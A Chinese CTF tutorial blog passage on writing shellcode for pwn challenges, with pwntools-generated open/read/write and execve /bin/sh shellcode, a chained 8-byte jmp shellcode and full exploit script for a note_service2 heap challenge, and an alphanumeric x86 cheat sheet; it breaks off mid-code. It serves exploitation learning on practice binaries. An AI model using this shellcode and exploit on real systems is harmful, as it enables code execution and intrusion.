<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="2a1a9b16fa2e82d54101caad135f9707">shellcode编写过程总结</h1>
<p>序言: 平时做题也遇到过一些编写shellcode的题目了，最近抽空总结下类型，以及编写过程</p>
<h2 data-content="1" id="c43ae47bcef7a2f5d7d50217616a5789">利用工具生成或直接查找</h2>
<p><a href="https://github.com/users/NoOne-hub/projects/1" target="_blank">我收集了一些工具生成纯字母数字shellcode的</a><br/>
比如 pwntools的 shellcraft模块<br/>
或者到<a href="https://www.exploit-db.com/shellcodes" target="_blank">exploit-db</a>直接查找</p>
<p>这种题好做，利用工具生成，比如pwnable.tw 的 orw，这题就是可以直接利用工具生成的</p>
<div class="highlight"><pre><span></span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">'/home/orw/flag'</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">'eax'</span><span class="p">,</span><span class="s1">'esp'</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'esp'</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
</pre></div>
<p>三句代码搞定，这种是限制了只能用open,read,write的</p>
<p>还可以手写汇编,对于unctf的orwpwn可以手写汇编，不过没必要啊，复制黏贴也是可以的</p>
<div class="highlight"><pre><span></span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'''</span>
<span class="s1">    push 0x67616c66</span>
<span class="s1">    mov rdi,rsp</span>
<span class="s1">    xor esi,esi</span>
<span class="s1">    push 2</span>
<span class="s1">    pop rax</span>
<span class="s1">    syscall</span>
<span class="s1">    mov rdi,rax</span>
<span class="s1">    mov rsi,rsp</span>
<span class="s1">    mov edx,0x100</span>
<span class="s1">    xor eax,eax</span>
<span class="s1">    syscall</span>
<span class="s1">    mov edi,1</span>
<span class="s1">    mov rsi,rsp</span>
<span class="s1">    push 1</span>
<span class="s1">    pop rax</span>
<span class="s1">    syscall</span>
<span class="s1">    '''</span><span class="p">)</span>
</pre></div>
<p>在比如说那种直接输入shellcode执行的，攻防世界新手区有道题目string,就是直接输入shellcode拿shell的，这种可以用shellcraft.sh()或者exploit-db查找</p>
<div class="highlight"><pre><span></span><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span><span class="s2">"</span>
</pre></div>
<p>随便拿个shellcode举例吧</p>
<h3 data-content="1" id="e76ac51ef3ceeae2eabb41574fe5603a">练习题</h3>
<ol>
<li>攻防世界pwn新手区的string</li>
<li>中科大比赛的shellhacker(3个类型)都是可以用工具生成解决的</li>
<li>pwnable.tw的orw</li>
<li>unctf的orwpwn</li>
</ol>
<p>这些都还可以找得到题目来的，可以自行查找，我当时是手写了汇编练习，实际工具一把梭也是可以的</p>
<h2 data-content="1" id="c2bbd01fc8ccdc86e6e195c72ffb5041">手写shellcode</h2>
<p>这种题目我认为难度就比较大了，汇编基础不扎实的确实难，对我来说也是一样的,不过还是要总结下编写过程，这样以后遇到才不会慌</p>
<p>就从最简单的shellcode编写开始吧，难度层级如下，一层一层更难</p>
<ol>
<li>攻防世界的note_service2</li>
<li>pwnable.tw 的death_note</li>
<li>pwnable.tw 的alive_note</li>
</ol>
<h3 data-content="1" id="8a1a940ba983e90a06e6e0a60a06956c">note_service2</h3>
<p>这道题又让我学了不少东西</p>
<p>复习了下jmp的跳转，以及机器码</p>
<p>0xE8    CALL    后面的四个字节是地址<br/>
0xE9    JMP    后面的四个字节是偏移<br/>
0xEB    JMP    后面的二个字节是偏移<br/>
0xFF15    CALL    后面的四个字节是存放地址的地址<br/>
0xFF25    JMP    后面的四个字节是存放地址的地址<br/>
0x68    PUSH    后面的四个字节入栈<br/>
0x6A    PUSH    后面的一个字节入栈</p>
<h4 data-content="1" id="396d52aaa3703f1ec7321ec46102084a">漏洞</h4>
<p>发觉有个double free，然后8个字节不知道怎么利用，然后卡死了</p>
<p>看了wp后，原来这道又是出自pwnable.tw的，经过他人修改，然后出题了，考点是shellcode链的构造，也就是手写汇编能力</p>
<h4 data-content="1" id="36c4c3b7fa8fd09f5548e8c32834678b">漏洞利用</h4>
<p>这里查看保护发觉nx保护没开，所以想着如何写shellcode，8个字节，我也没想出怎么写shellcode，大佬们强啊，shellcode链，利用近转移，一步步跳过去，组合起来就是大shellcode了，这跟ROP类似啊，我怎么就想不到呢，在此还是先佩服下师傅们</p>
<h5 data-content="1" id="fc1d3f3625198e91ce282d3d969b18c2">细节点</h5>
<p>调试部分我用edb测试了下，edb打开随便一个程序，测了下E916，发觉他会自动改成5个字节<br/>
其余指令可以用pwntools测试，asm('xor rsi,rsi',arch='amd64')<br/>
free_got - heap地址，这个相对偏移是确定的，所以可以用index这样寻址</p>
<p>至于为什么是E916,这个可以计算下，<br/>
短转移:<br/>
假设目前指令为:</p>
<div class="highlight"><pre><span></span>0x1000 E9 <span class="m">16</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
0x1005 <span class="m">90</span>
0x1006 <span class="m">90</span>
    .
    .
    .
0x101b <span class="m">90</span>
</pre></div>
<p>1000+16+5=101b</p>
<p>至于为什么这么计算，通俗点讲就是执行完这条指令才会跳转，所以执行完这条指令地址本应该为1005，所以为什么要+5，然后jmp的话，他要跳到相对于这里16处，所以就是0x101b处了</p>
<p>细想一下，delete(0)为什么可以执行system函数呢，因为free(0)的话，首先将参数传进去，也就是第一个堆块地址，就是存/bin/sh处，放到rdi里，后面开始执行shellcode链</p>
<h5 data-content="1" id="54c8d9c12429be63ccabf00fc4adb18e">编写shellcode链过程</h5>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 <span class="m">0</span> <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 <span class="m">0</span> <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 <span class="m">0</span> <span class="m">0</span>
0x60 <span class="m">0</span> 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<ol>
<li>建立起堆块的结构链条，如上</li>
<li>建立起sys_execve需要的寄存器rdi,rsi,rdx,rax</li>
<li>rdi为/bin/sh，rsi=0，rdx=0,rax=0x3b</li>
<li>xor rsi,rsi 对应字节码 0xf63148，三个字节,先将这个放进去，然后要跳转到0x30处，所以现在编写jmp语句 e9 大小，具体多少，0x30-0x10-3-5=0x18,所以是e918</li>
</ol>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 00000018e94831f6 <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 <span class="m">0</span> <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 <span class="m">0</span> <span class="m">0</span>
0x60 <span class="m">0</span> 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<ol>
<li>xor rdx,rdx 对应字节码0xd23148，三个字节，接着跳 ，一样的 e918</li>
</ol>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 00000018e94831f6 <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 00000018e94831d2 <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 <span class="m">0</span> <span class="m">0</span>
0x60 <span class="m">0</span> 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<ol>
<li>rax=0x3b, push 0x3b,pop rax,为0x3b6a58 三个字节，还是一样的</li>
</ol>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 00000018e94831f6 <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 00000018e94831d2 <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 00000018e9586a3b <span class="m">0</span>
0x60 <span class="m">0</span> 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<ol>
<li>最后syscall 0x050f </li>
</ol>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 00000018e94831f6 <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 00000018e94831d2 <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 00000018e9586a3b <span class="m">0</span>
0x60 0f05 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<ol>
<li>测试了下，不成功，因为content不为8不会退出，那就加3个nop吧凑个整数，这样少跳3个nop就行，所以最后变成</li>
</ol>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 16e99090904831f6 <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 16e99090904831d2 <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 16e9909090586a3b <span class="m">0</span>
0x60 9090909090900f50 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<p>emm，测试不成功，原因是，最多接受7个...题目里限制了，所以改成2个nop</p>
<div class="highlight"><pre><span></span>0x00 <span class="m">0</span> 0x21
0x10 0016e990904831f6 <span class="m">0</span>
0x20 <span class="m">0</span> 0x21
0x30 0016e990904831d2 <span class="m">0</span>
0x40 <span class="m">0</span> 0x21
0x50 0016e99090586a3b <span class="m">0</span>
0x60 0090909090900f50 0x21
0x70 <span class="m">0</span> <span class="m">0</span>
</pre></div>
<h4 data-content="1" id="943d4d65e689d7ea0fcac48bfba9cd27">exp</h4>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">local</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">host</span> <span class="o">=</span> <span class="s1">'111.198.29.45'</span> 
<span class="n">port</span> <span class="o">=</span> <span class="mi">49964</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
<span class="n">exe</span> <span class="o">=</span> <span class="s1">'/tmp/tmp.sGaluM2IXs/note'</span>
<span class="c1"># Load it if has exe</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Elf can't be load"</span><span class="p">)</span>

<span class="c1"># load libc </span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span> <span class="k">if</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="k">else</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so.6"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
<span class="c1">#don't forget to change it</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>                              <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>                              <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>                               <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>                                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span>                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rg</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">regex</span>                                   <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvregex</span><span class="p">(</span><span class="n">regex</span><span class="p">)</span>
<span class="n">rp</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span>                               <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">lg</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>                                  <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'</span><span class="se">\033</span><span class="s1">[1;31;40m</span><span class="si">%20s</span><span class="s1">--&gt;0x</span><span class="si">%x</span><span class="se">\033</span><span class="s1">[0m'</span><span class="o">%</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
<span class="n">ga</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">job</span><span class="o">=</span><span class="s2">""</span>                                  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">job</span><span class="p">)</span> <span class="k">if</span> <span class="n">local</span> <span class="k">else</span> <span class="mi">0</span>
<span class="n">ia</span>   <span class="o">=</span> <span class="k">lambda</span>                                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># break on aim addr</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">PIE</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">PIE</span><span class="p">:</span>
        <span class="n">text_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">"pmap {}| awk '{{print $1}}'"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">))</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">ga</span><span class="p">(</span><span class="s1">'b *{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="o">+</span><span class="n">addr</span><span class="p">)))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ga</span><span class="p">(</span><span class="s2">"b *{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>

<span class="c1"># get_one_gadget</span>
<span class="k">def</span> <span class="nf">get_one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">"one_gadget --raw "</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">))</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>
    <span class="c1"># Arch:     amd64-64-little</span>
    <span class="c1"># RELRO:    Partial RELRO</span>
    <span class="c1"># Stack:    Canary found</span>
    <span class="c1"># NX:       NX disabled</span>
    <span class="c1"># PIE:      PIE enabled</span>
    <span class="c1"># RWX:      Has RWX segments</span>

<span class="k">def</span> <span class="nf">c</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">"&gt;&gt; "</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">rce</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">rce</span><span class="p">:</span>
        <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">get_one_gadget</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>

    <span class="c1">#start here</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'/bin/sh'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">((</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'free'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x2020A0</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'xor rsi,rsi'</span><span class="p">)</span><span class="o">+</span> <span class="s1">'</span><span class="se">\x90\x90\xe9\x16</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'push 0x3b</span><span class="se">\n</span><span class="s1"> pop rax'</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x90\x90\xe9\x16</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'xor rdx, rdx'</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x90\x90\xe9\x16</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'syscall'</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">ga</span><span class="p">()</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">ia</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,)</span>
</pre></div>
<h3 data-content="1" id="3171a82431e4ad65cf2fe5fa5067f485">death_note</h3>
<p>我是先做完alive_note再来做这道，看了下，难度比alive_note确实简单了一些，那题手写shellcode跳转链条，真的麻烦，这题直接0x50字节的shellcode执行就行，还是改got表,然后手写汇编就ok了</p>
<p>数字字母汇编代码，大佬总结的</p>
<div class="highlight"><pre><span></span><span class="m">1</span>.数据传送:
push/pop eax…
pusha/popa

<span class="m">2</span>.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, al dl…
sub byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, ah dh…
sub dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, esi edi
sub word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, si di
sub al dl…, byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
sub ah dh…, byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
sub esi edi, dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
sub si di, word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>

<span class="m">3</span>.逻辑运算:
and al, 立即数
and dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, esi edi
and word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, si di
and ah dh…, byte ptr <span class="o">[</span>ecx edx… + 立即数<span class="o">]</span>
and esi edi, dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
and si di, word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>

xor al, 立即数
xor byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, al dl…
xor byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, ah dh…
xor dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, esi edi
xor word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, si di
xor al dl…, byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
xor ah dh…, byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
xor esi edi, dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
xor si di, word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>

<span class="m">4</span>.比较指令:
cmp al, 立即数
cmp byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, al dl…
cmp byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, ah dh…
cmp dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, esi edi
cmp word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>, si di
cmp al dl…, byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
cmp ah dh…, byte ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
cmp esi edi, dword ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>
cmp si di, word ptr <span class="o">[</span>eax… + 立即数<span class="o">]</span>

<span class="m">5</span>.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

&lt;<span class="o">=</span>&gt; jmp lable

<span class="m">6</span>.交换al, ah
push eax
xor ah, byte ptr <span class="o">[</span>esp<span class="o">]</span> // ah ^<span class="o">=</span> al
xor byte ptr <span class="o">[</span>esp<span class="o">]</span>, ah // al ^<span class="o">=</span> ah
xor ah, byte ptr <span class="o">[</span>esp<span class="o">]</span> // ah ^<span class="o">=</span> al
pop eax

<span class="m">7</span>.清零:
push 44h
pop eax
sub al, 44h <span class="p">;</span> <span class="nv">eax</span> <span class="o">=</span> <span class="m">0</span>

push esi
push esp
pop eax
xor <span class="o">[</span>eax<span class="o">]</span>, esi <span class="p">;</span> <span class="nv">esi</span> <span class="o">=</span> <span class="m">0</span>
</pre></div>
<h4 data-content="1" id="4aed104439b45b9bb150de9daac02124">构造shellcode思路</h4>
<p>首先得明白我们应该要什么样的结果</p>
<div class="highlight"><pre><span></span><span class="nf">eax</span><span class="err">=</span><span class="mi">0xb</span>
<span class="nf">ecx</span><span class="err">=</span><span class="mi">0</span>
<span class="nf">ebx</span><span class="err">=</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh地址</span>
<span class="nf">edx</span> <span class="err">=</span> <span class="mi">0</span>
</pre></div>
<p>然后开始构造</p>
<ol>
<li>先用shellcraft.sh()生成shellcode，发觉还是有可取之处，我们将push /bin/sh部分取出来就好了</li>
</ol>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="s1">'jhh///sh/bin</span><span class="se">\x89\xe3</span><span class="s1">h</span><span class="se">\x01\x01\x01\x01\x81</span><span class="s1">4$ri</span><span class="se">\x01\x01</span><span class="s1">1</span><span class="se">\xc9</span><span class="s1">Qj</span><span class="se">\x04</span><span class="s1">Y</span><span class="se">\x01\xe1</span><span class="s1">Q</span><span class="se">\x89\xe1</span><span class="s1">1</span><span class="se">\xd2</span><span class="s1">j</span><span class="se">\x0b</span><span class="s1">X</span><span class="se">\xcd\x80</span><span class="s1">'</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="mi">0x68</span>
    <span class="nf">push</span> <span class="mi">0x732f2f2f</span>
    <span class="nf">push</span> <span class="mi">0x6e69622f</span>
    <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
</pre></div>
<p>然后修改代码，mov ebx,esp改成push esp, pop ebx</p>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="mi">0x68</span> <span class="c">#push /bin/sh</span>
    <span class="no">push</span> <span class="mi">0x732f2f2f</span>
    <span class="nf">push</span> <span class="mi">0x6e69622f</span>
    <span class="nf">push</span> <span class="no">esp</span>
    <span class="nf">pop</span> <span class="no">ebx</span>
</pre></div>
<ol>
<li>我free的时候会传进来heap地址，所以我们初始地址存在了eax里，记得保存，还有传进来同时ecx=0xa,edx=0,这些都是可以利用的，构造eax=0xb</li>
</ol>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
</pre></div>
<p>同时，这段代码可以作为滑板，一直执行</p>
<ol>
<li>构造ecx=0</li>
</ol>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">edx</span>
    <span class="nf">pop</span> <span class="no">ecx</span>
</pre></div>
<ol>
<li>最主要要构造int 0x80，先将前面的shellcode拼接起来，具体怎么个顺序可以自行调整，不过要清楚寄存器没有被破坏</li>
</ol>
<p>我构造了这样的顺序</p>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
    <span class="nf">push</span> <span class="no">edx</span>
    <span class="nf">pop</span> <span class="no">ecx</span>
    <span class="nf">push</span> <span class="mi">0x68</span> <span class="c">#push /bin/sh</span>
    <span class="no">push</span> <span class="mi">0x732f2f2f</span>
    <span class="nf">push</span> <span class="mi">0x6e69622f</span>
    <span class="nf">push</span> <span class="no">esp</span>
    <span class="nf">pop</span> <span class="no">ebx</span>
</pre></div>
<p>最前面来构造int 0x80,因为此时堆块地址还未被破坏，</p>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">eax</span> <span class="c">#堆块地址</span>
    <span class="no">pop</span> <span class="no">ebx</span> <span class="c">#保存堆块地址到ebx</span>
    <span class="no">push</span> <span class="no">edx</span>
